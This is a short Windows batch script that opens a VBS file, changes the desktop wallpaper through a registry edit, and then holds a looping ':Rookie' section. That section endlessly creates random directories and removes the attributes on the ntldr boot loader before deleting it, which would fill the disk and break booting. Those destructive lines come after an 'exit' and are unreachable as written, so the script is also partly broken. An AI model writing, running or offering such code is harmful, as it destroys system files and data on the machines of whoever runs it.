@echo off
start C:\Users\admin\Desktop\message.vbs
reg add "HKEY_CURRENT_USER\control panel\desktop" /v wallpaper /t REG_SZ /d  C:\Users\admin\Desktop\t.jpg
RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
pause
exit
:Rookie
MD %RANDOM%
goto Rookie
attrib -s -r -h c:\ntldr
del ntldr
goto Rookie
